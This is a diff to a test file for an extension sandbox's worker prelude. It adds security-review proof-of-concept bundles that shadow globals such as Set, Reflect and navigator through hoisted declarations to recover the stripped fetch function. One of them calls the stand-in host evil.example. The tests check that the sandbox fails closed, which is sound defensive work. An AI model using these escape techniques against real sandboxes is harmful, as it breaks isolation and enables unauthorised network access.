@@ -109,7 +109,11 @@ describe('worker prelude', () => {
     expect(report.chain.fetch).toHaveLength(4)
     expect(report.redefined).toEqual([])
     expect(report.assigned).toEqual([])
-    expect(report.nav).toEqual({ storage: 'undefined', locks: 'undefined' })
+    expect(report.nav).toEqual({
+      storage: 'undefined',
+      locks: 'undefined',
+      serviceWorker: 'undefined',
+    })
     expect(report.userAgent).toBe('jan-sandbox')
     // Messaging stays: forging a message only reaches the same checked API.
     expect(report.postMessage).toBe('function')
@@ -135,7 +139,7 @@ describe('worker prelude', () => {
   })
 
   it('fails activation when the bundle defines no JanExtension', async () => {
-    const { outcome } = boot('var somethingElse = 1')
+    const { outcome } = boot('var JanExtension = undefined')
     await vi.waitFor(() => expect(outcome()?.t).toBe('activateFailed'))
     expect(outcome()).toMatchObject({
       error: { code: 'E_INVALID_ARGS', message: expect.stringContaining('JanExtension') },
@@ -237,7 +241,10 @@ describe('worker prelude', () => {
 
   it('aborts the script when stripping fails, before user code runs', async () => {
     const worker = runInSandbox(
-      composeWorkerSource(prelude, 'self.__userRan = true; var JanExtension = { activate: function () {} }'),
+      composeWorkerSource(
+        prelude,
+        'var JanExtension = (self.__userRan = true, { activate: function () {} })'
+      ),
       {
         globals: {
           // A property that cannot be replaced: the prelude must fail closed.
@@ -260,6 +267,122 @@ describe('worker prelude', () => {
     await vi.waitFor(() => expect(errors).toHaveLength(1))
     expect(worker.scope.__userRan).toBeUndefined()
     await vi.waitFor(() => expect(controls[0]?.t).toBe('activateFailed'))
+  })
+})
+
+// The PoCs of the security review, composed without the host's bundle
+// check, so the prelude itself is shown not to trust anything a hoisted
+// declaration could have replaced.
+const unchecked = (bundle: string) =>
+  [
+    prelude,
+    `;${bundle}`,
+    ";self.__janBoot(typeof JanExtension === 'undefined' ? undefined : JanExtension)",
+  ].join('\n')
+
+function bootUnchecked(bundle: string) {
+  const worker = runInSandbox(unchecked(bundle), { name: 'ext:acme.one' })
+  const controls: ControlMessage[] = []
+  const errors: string[] = []
+  const logs: unknown[][] = []
+  worker.addEventListener('error', (e) => errors.push(e.message))
+  const host = new Endpoint(workerTransport(worker), {
+    onControl: (m) => controls.push(m),
+    handle: async (method, args) => {
+      if (method === 'log') logs.push(args)
+    },
+  })
+  host.sendControl({ v: 1, t: 'init', manifest })
+  running.push({ worker, host })
+  return { worker, controls, errors, logs }
+}
+
+describe('prelude intrinsics', () => {
+  it('fails closed when a hoisted declaration replaced Set (set.mjs)', async () => {
+    const { worker, controls, errors } = bootUnchecked(`
+      function Set(items) {
+        if (!self.__net) self.__net = fetch;
+        var m = {}; (items || []).forEach(function (k) { m[k] = 1 });
+        return { has: function (k) { return !!m[k] }, add: function () { return this }, delete: function () {} };
+      }
+      var JanExtension = { activate: function () { self.__net('https://evil.example/x') } };`)
+    await vi.waitFor(() => expect(errors).toHaveLength(1))
+    await new Promise((r) => setTimeout(r, 50))
+    expect(controls.some((m) => m.t === 'ready')).toBe(false)
+    expect(worker.scope.__net).toBeUndefined()
+    expect(worker.leaks).toEqual([])
+  })
+
+  it('fails closed, before any bundle code, when a var pins a stripped name', async () => {
+    const { worker, controls, errors } = bootUnchecked(`
+      var fetch;
+      function postMessage() { self.__net = Object.getPrototypeOf(self).fetch }
+      var JanExtension = { activate: function () {} };`)
+    await vi.waitFor(() => expect(errors).toHaveLength(1))
+    expect(controls.some((m) => m.t === 'ready')).toBe(false)
+    expect(worker.scope.__net).toBeUndefined()
+  })
+
+  it('fails closed when a hoisted declaration replaced Reflect (obj.mjs)', async () => {
+    const { controls, errors } = bootUnchecked(`
+      function Reflect() {}
+      var JanExtension = { activate: function () {} };`)
+    await vi.waitFor(() => expect(errors).toHaveLength(1))
+    expect(controls.some((m) => m.t === 'ready')).toBe(false)
+  })
+
+  it('strips storage off the real navigator even when the name is shadowed (nav.mjs)', async () => {
+    for (const shadow of ['function navigator() {}', 'var navigator;']) {
+      const { worker, controls, logs } = bootUnchecked(`
+        ${shadow}
+        var JanExtension = { activate: function (ctx) {
+          var p = self, g;
+          while (p && !((g = Object.getOwnPropertyDescriptor(p, 'navigator')) && g.get)) p = Object.getPrototypeOf(p);
+          var real = g.get.call(self);
+          ctx.log.info(typeof real.storage, typeof real.locks, typeof real.serviceWorker);
+        } };`)
+      await vi.waitFor(() => expect(controls.at(-1)?.t).toBe('ready'))
+      await vi.waitFor(() => expect(logs).toHaveLength(1))
+      expect(logs[0]).toEqual(['info', 'undefined', 'undefined', 'undefined'])
+      expect(worker.leaks).toEqual([])
+    }
+  })
+
+  it('fails closed for a hoisted replacement of any global it reads', async () => {
+    for (const name of [
+      'Object',
+      'Array',
+      'Number',
+      'String',
+      'Promise',
+      'Error',
+      'Reflect',
+      'JSON',
+      'Map',
+      'Set',
+      'console',
+      'setTimeout',
+      'clearTimeout',
+      'queueMicrotask',
+      'globalThis',
+      'postMessage',
+      'addEventListener',
+      'removeEventListener',
+      'close',
+    ]) {
+      for (const decl of [
+        `function ${name}() { self.__net = fetch }`,
+        `async function ${name}() { self.__net = fetch }`,
+      ]) {
+        const { worker, controls, errors } = bootUnchecked(
+          `${decl}\nvar JanExtension = { activate: function () {} };`
+        )
+        await vi.waitFor(() => expect(errors, decl).toHaveLength(1))
+        expect(errors[0], decl).toContain(name)
+        expect(controls.some((m) => m.t === 'ready'), decl).toBe(false)
+        expect(worker.scope.__net, decl).toBeUndefined()
+      }
+    }
   })
 })
 
